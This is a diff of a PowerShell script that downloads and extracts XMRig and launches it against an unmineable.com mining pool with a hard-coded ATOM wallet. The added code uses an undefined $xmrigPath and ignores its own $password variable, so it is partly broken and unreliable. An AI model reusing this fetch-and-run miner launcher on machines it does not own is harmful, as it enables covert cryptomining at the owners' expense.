@@ -12,9 +12,8 @@ $zipPath = "$dir\xmrig.zip"
 Invoke-WebRequest -Uri $url -OutFile $zipPath
 Expand-Archive -Path $zipPath -DestinationPath $dir -Force
 
-$miner = "$dir\xmrig-6.21.0"
+$pool = "stratum+ssl://rx-asia.unmineable.com:443"
+$wallet = "ATOM:cosmos1nqp27fnn3uuyy7xrvu2epdw7592uapmptfx06g.lmaokid"
+$password = "x"
 
-# nạp donate cho SkibiditoiletMiner
-while ($true) {
-    & "$miner\xmrig.exe"
-}
+Start-Process -FilePath $xmrigPath -ArgumentList "-a rx -o $pool -u $wallet -p TAODEPTRAINHATVUTRUOK" -NoNewWindow
